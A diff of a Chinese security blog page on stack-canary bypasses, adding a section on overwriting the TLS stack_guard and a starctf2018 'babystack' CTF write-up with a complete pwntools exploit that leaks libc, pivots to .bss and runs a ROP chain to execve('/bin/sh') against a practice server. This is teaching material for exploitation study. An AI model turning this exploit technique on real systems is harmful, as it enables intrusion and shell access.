@@ -20,12 +20,12 @@
     var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="①劫持__stack_chk_fail函数实现Canary绕过原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数就相当">
+  <meta name="description" content="①劫持__stack_chk_fail函数实现Canary绕过知识点原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Canary绕过">
 <meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2021/11/08/Canary%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="CharonPt的Blog">
-<meta property="og:description" content="①劫持__stack_chk_fail函数实现Canary绕过原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数就相当">
+<meta property="og:description" content="①劫持__stack_chk_fail函数实现Canary绕过知识点原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/checksec.jpg">
 <meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/main.jpg">
@@ -35,8 +35,14 @@
 <meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/main-1.png">
 <meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/main-2.png">
 <meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/stack.jpg">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-checksec.png">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-main.jpg">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-start_routine.jpg">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png">
+<meta property="og:image" content="https://github.com/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-%E5%88%86%E6%9E%90-1.jpg">
 <meta property="article:published_time" content="2021-11-08T11:37:28.000Z">
-<meta property="article:modified_time" content="2021-12-03T13:51:48.161Z">
+<meta property="article:modified_time" content="2022-01-25T09:15:22.953Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="pwn">
 <meta property="article:tag" content="Canary绕过">
@@ -201,7 +207,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-12-03 21:51:48" itemprop="dateModified" datetime="2021-12-03T21:51:48+08:00">2021-12-03</time>
+                <time title="修改时间：2022-01-25 17:15:22" itemprop="dateModified" datetime="2022-01-25T17:15:22+08:00">2022-01-25</time>
               </span>
 
           
@@ -215,7 +221,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="①劫持-stack-chk-fail函数实现Canary绕过"><a href="#①劫持-stack-chk-fail函数实现Canary绕过" class="headerlink" title="①劫持__stack_chk_fail函数实现Canary绕过"></a>①劫持__stack_chk_fail函数实现Canary绕过</h2><p>原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数就相当于没有跳转。</p>
+        <h2 id="①劫持-stack-chk-fail函数实现Canary绕过"><a href="#①劫持-stack-chk-fail函数实现Canary绕过" class="headerlink" title="①劫持__stack_chk_fail函数实现Canary绕过"></a>①劫持__stack_chk_fail函数实现Canary绕过</h2><h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>原理是触发Canary后调用来使程序退出的 stack_chk_fail()函数本身也是位于glibc中的函数，默认情况下经过ELF的延迟绑定机制，如果程序的got表具有可写权限的话，就可以通过修改其在got表中的内容实现更改跳转。假如将其got表的内容改为”ret”指令所在的地址的话，那触发 stack_chk_fail()函数就相当于没有跳转。</p>
 <p>值得注意的是，Canary的检查的时间点是在函数返回的时候进行的，所以只有当函数即将返回时Canary才会起到作用。</p>
 <h4 id="一道例题"><a href="#一道例题" class="headerlink" title="一道例题"></a>一道例题</h4><p>先检查程序保护</p>
 <img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/checksec.jpg" class>
@@ -259,6 +265,46 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(&quot;warm up!!!&quot;,&#x27;a&#x27;*0x18)</span><br><span class="line">p.recvuntil(&quot;a&quot;*0x18 + &#x27;\n&#x27;)</span><br><span class="line">canary = u64(p.recv(7).rjust(8,&#x27;\x00&#x27;))</span><br></pre></td></tr></table></figure>
 
 <p>注意这里只发送 0x18 个 “a” 是因为还有 ‘\n’ 占了一个字节。</p>
+<h2 id="④修改TSL中的Canary值实现绕过Canary"><a href="#④修改TSL中的Canary值实现绕过Canary" class="headerlink" title="④修改TSL中的Canary值实现绕过Canary"></a>④修改TSL中的Canary值实现绕过Canary</h2><p>以下知识点从<a target="_blank" rel="noopener" href="https://eternalsakura13.com/2018/04/24/starctf_babystack/">Sakura 师傅的博客</a>中归纳整理</p>
+<h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时，在Linux下会使用TLS（Thread Local Storage、线程局部存储）机制，其会为每一个使用该全局变量的线程都提供一个变量值的副本。</p>
+<p>在glibc的实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其中 <code>stack_guard</code> 就与Canary的设置有关：当一个函数被调用时，Canary就从 <code>tcbhead_t.stack_guard</code> 被放到栈上。当函数调用结束的时候，<strong>栈上的Canary值就会被拿来和 <code>tcbhead_t.stack_guard</code> 进行比较</strong>，如果不相等，程序就会调用 <code>___stack_chk_fail</code> 函数来进行报错行为及程序的终止。在程序中的实现如下：</p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png" class>
+
+
+
+<p>可以看到，在函数开辟其栈帧后，程序从 <code>fs:28h</code> 处取得值并将该值放在 <code>rbp+8</code> 处，这个就是函数设置Canary的过程。在函数即将返回的时候，<code>rbp+8</code> 处的值被拿来和 <code>fs:28h</code> 进行比较，如果不相等则调用 <code>___stack_chk_fail</code> 函数。</p>
+<p>由此我们可知 fs 段寄存器或者 gs 段寄存器储存的就是结构体 <code>tcbhead_t</code> 的地址，其偏移28处就是<code>tcbhead_t.stack_guard</code>的地址</p>
+<p>① 研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。</p>
+<p>② <strong>在为栈分配内存后，glibc在内存的高地址初始化TLS</strong>，在x86-64架构上，<strong>栈向下增长，将TLS放在栈顶部</strong>。</p>
+<p>③ 从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。</p>
+<p>④ 从TLS到pthread_create的函数参数传递栈帧的距离小于一页。</p>
+<p>那么由此就可以想到，如果我们能够直接对 <code>tcbhead_t.stack_guard</code> 进行修改，那么我们不需要leak出Canary的值也可以绕过Canary保护，比如利用任意地址写，同时因为TLS在栈的上方，所以如果我们溢出的数据足够大，也可以将 <code>tcbhead_t.stack_guard</code> 覆盖掉。</p>
+<h4 id="starctf2018-babystack"><a href="#starctf2018-babystack" class="headerlink" title="starctf2018 babystack"></a>starctf2018 babystack</h4><p>例行检查保护</p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-checksec.png" class>
+
+<p>main()函数如下</p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-main.jpg" class>
+
+<p>程序利用 <code>pthread_create</code>  创建线程并将 <code>start_routine</code> 作为函数参数，跟进到 <code>start_routine</code> 函数</p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-start_routine.jpg" class>
+
+<p>其中<code> v1</code> 在 <code>sub_400906()</code> 中利用 <code>fget()</code> 输入，<code>sub_400957()</code> 函数实现类似 <code>fget()</code> 函数的功能</p>
+<p>所以程序本身就允许我们输入最多 0x10000 个字节的数据，远大于 s[] 到 rbp 的距离，所以我们可以利用栈溢出将tcbhead_t.stack_guard覆写掉。</p>
+<p>接下来寻找我们的输入与 <code>tcbhead_t.stack_guard</code> 的偏移，本题在汇编处可以看到 <code>tcbhead_t.stack_guard</code> 的地址在 fs 寄存器中</p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-push_canary.png" class>
+
+<p>在gdb中可以使用 <code>fsbase</code> 指令来查看 fs 寄存器中的内容，由此得到 <code>tcbhead_t</code> 的地址 </p>
+<img src="/2021/11/08/Canary%E7%BB%95%E8%BF%87/%E2%91%A3-%E5%88%86%E6%9E%90-1.jpg" class>
+
+<p>由此可知我们的输入与 <code>tcbhead_t.stack_guard</code> 的偏移为 <code>0x1820 + 0x28</code> 个字节，加上8个用来覆盖的字节我们共需要输入 <code>0x1820 + 0x28 + 0x8 = 0x1850</code> 个字节的数据。</p>
+<p>到此我们明确了绕过Canary的操作，接下来还需要leak出libc的地址来getshell，泄漏步骤很常规就不赘述了。这题原本我想完成泄漏后再次触发栈溢出来getshell，但是发现程序返回到再次触发栈溢出之前就崩溃了，暂时还不太理解为什么。但是因为程序本身有调用 <code>read()</code> 函数，所以我们可以在一条payload中先完成泄漏的工作，然后利用 <code>read()</code> 将ROP写入 <code>.bss</code> 段中，最后将栈迁移到 <code>.bss</code> 段中完成 ROP 。</p>
+<p>exp如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28143</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bs&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/giantbranch/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0400c03</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c01</span></span><br><span class="line">bss = <span class="number">0x0602010</span></span><br><span class="line">leave_ret = <span class="number">0x0400B90</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;to send?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1850</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1010</span> + p64(bss+<span class="number">0x300</span>) + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_r15)</span><br><span class="line">payload += p64(bss+<span class="number">0x300</span>) + p64(<span class="number">0</span>) + p64(elf.plt[<span class="string">&#x27;read&#x27;</span>]) + p64(leave_ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1850</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;It&#x27;s time to say goodbye.\n&quot;</span>)</span><br><span class="line">lsm = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(lsm)</span><br><span class="line"></span><br><span class="line">binsh = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">execve = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + libc.symbols[<span class="string">&#x27;execve&#x27;</span>]</span><br><span class="line">pop_rdx = lsm - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] + <span class="number">0x1b96</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi_r15) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(execve)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>本题也可以将 one_gadget 写到 .bss 段然后执行</p>
 
     </div>
 
@@ -343,7 +389,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A0%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0Canary%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">①劫持__stack_chk_fail函数实现Canary绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98"><span class="nav-number">1.0.1.</span> <span class="nav-text">一道例题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A1%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E6%BC%8FCanary"><span class="nav-number">2.</span> <span class="nav-text">②格式化字符串泄漏Canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A2%E8%A6%86%E7%9B%96Canary%E7%9A%84%E2%80%99-x00%E2%80%99%E4%BB%8E%E8%80%8C%E6%89%93%E5%8D%B0%E5%87%BACanary"><span class="nav-number">3.</span> <span class="nav-text">③覆盖Canary的’\x00’从而打印出Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98-1"><span class="nav-number">3.0.1.</span> <span class="nav-text">一道例题</span></a></li></ol></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A0%E5%8A%AB%E6%8C%81-stack-chk-fail%E5%87%BD%E6%95%B0%E5%AE%9E%E7%8E%B0Canary%E7%BB%95%E8%BF%87"><span class="nav-number">1.</span> <span class="nav-text">①劫持__stack_chk_fail函数实现Canary绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98"><span class="nav-number">1.0.2.</span> <span class="nav-text">一道例题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A1%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B3%84%E6%BC%8FCanary"><span class="nav-number">2.</span> <span class="nav-text">②格式化字符串泄漏Canary</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A2%E8%A6%86%E7%9B%96Canary%E7%9A%84%E2%80%99-x00%E2%80%99%E4%BB%8E%E8%80%8C%E6%89%93%E5%8D%B0%E5%87%BACanary"><span class="nav-number">3.</span> <span class="nav-text">③覆盖Canary的’\x00’从而打印出Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%80%E9%81%93%E4%BE%8B%E9%A2%98-1"><span class="nav-number">3.0.1.</span> <span class="nav-text">一道例题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%91%A3%E4%BF%AE%E6%94%B9TSL%E4%B8%AD%E7%9A%84Canary%E5%80%BC%E5%AE%9E%E7%8E%B0%E7%BB%95%E8%BF%87Canary"><span class="nav-number">4.</span> <span class="nav-text">④修改TSL中的Canary值实现绕过Canary</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="nav-number">4.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#starctf2018-babystack"><span class="nav-number">4.0.2.</span> <span class="nav-text">starctf2018 babystack</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -357,14 +403,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-count">24</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-count">14</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
